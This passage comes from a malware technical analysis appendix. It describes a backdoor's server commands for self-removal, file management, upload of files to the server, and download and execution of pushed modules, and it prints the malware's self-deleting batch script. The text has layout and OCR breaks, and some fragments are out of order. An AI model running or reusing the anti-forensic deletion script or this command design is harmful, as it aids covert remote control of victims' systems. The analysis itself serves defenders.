earlier or another variant of the code. this is also 
confirmed by by the shutdown procedure exe-
cuted afterwards, which is designed to disable 
Windows hook mechanism while it wasn’t used 
previously anywhere in the code.

1022: Self-remove
this command is used to self-remove current 
module and stop its execution. it attempts to 
create a local batch file named del.bat with the 
following contents and run it:

@echo off
ping /n 5 127.0.0.1 >nul
>nul del /f/s/q/a <CurrentModuleDir>\service.exe
>nul del /f/s/q/a <CurrentModuleDir>\service.dll
>nul del %0 /s/q/a/f del.bat

Please note non-standard way to call Windows 
command line interpreter which starts from re-
direction of output to nul virtual device. Also, 
the command arguments are not separated with 
space or tab characters, and it might look invalid, 
however cmd.exe on Windows xP, Windows 7 and 
Windows 8 executed it correctly without a problem.

1029: file manager
the  command  spawns  a  new  thread  which 
opens a new session with the server to provide 
file management operations.

the new thread makes 2 httP Get requests 
to the server, which are identical to the 3010 
request described above. the only difference 
is the request id, which is 4001 and 4002 for 
the first and second requests correspondingly. 
the output of the 4001 request is ignored, while 
request 4002 is interpreted.

the server response contains 2 dWord values: 
lets call them filecmdid and DataSize. if data-
size is non-zero the module fetches additional 
data which length is specified in the datasize 
option.

the Filecmdid defines which operation must be 
executed. it can be one of the following values:

5001: Get drive information. Provides informa-
tion about specified disk drive: free space, drive 
type. client command success code is 0, error 
code is 7004.

5002: Get file information. Provides information 
about specified file: file times, attributes. client 
command success code is 0, error code is 7003.

5003: Get directory information. Provides 
information about specified directory: directory 

 45

times, attributes, full size. client command suc-
cess code is 0, error code is 7003.

of the server should contain file data to write to 
the already opened file and execute right away.

5004: Get directory listing. Provide simple di-
rectory listing, which includes file names, sizes, 
last write time. client command success code is 
0, error code is 7001.

5006: create directory. create a new directory, 
which full path is provided by the server. client 
command success code is 0, error code is 7016.

5008: list drives. list available disk drives with 
information about free space. client command 
success code is 0, error code is not defined.

5009: run application. run local application 
with path and command line arguments passed 
from the server. client command success code 
is 0, error code is 7005.

5017: Get recursive directory listing. Provide 
recursive directory listing. client command suc-
cess code is 0, error code is 7000.

5025: run pushed executable. this command 
is used to save file pushed by the server and run 
instantly. When this command is received the 
module checks if it can create a new file, which 
name is passed by the server response. if it 
fails it submits error code 7003. then it spawns 
a new thread which issues a new httP Post 
request with command id 3005 and system in-
formation attached in the cGi Path. the request 

5026: upload file to the server. the command 
is used to read local file and transfer it to the 
server. it gets file information, including time-
stamps and size and spawns a new thread. if any 
of those operations fails the module reports er-
ror code 7003 to the server. otherwise it reports 
success code 0 and spawns a new thread. the 
new thread reads the file specified in the request 
and uploads it to the server.

1039: Download and run new module.
the module uses Paramb as an integer value 
indicating a length of a string to read next from 
the server response. the received string will be 
used as a newFilename. then it reads another 
dWord value from the server response and 
interprets it as a size of the following data to 
read. After that a new directory “internet ex-
plorer” is created in the directory of the current 
running module. then the module creates a new 
file using the value newFilename pushed by the 
server. the module makes 2 attempts to start a 
new process: by calling createProcessA system 
APi and shellexecuteA if the previous call failed.

the code was designed to support more com-
mands (1028, 1029, 1032, 1033, 1034, 1035, 
1036), however they are now falling into com-
mand 1029 handler and then ignored. We cre-
ated a chart showing a tree of commands de-
pendencies:

APPendix A: mAlWAre technicAl AnAlysis

the execution of this command processing thread continues in a loop until it is interrupt-
ed by shutdown command coming from the server. the code starts new loop iteration 
after hardcoded value of 30 seconds.
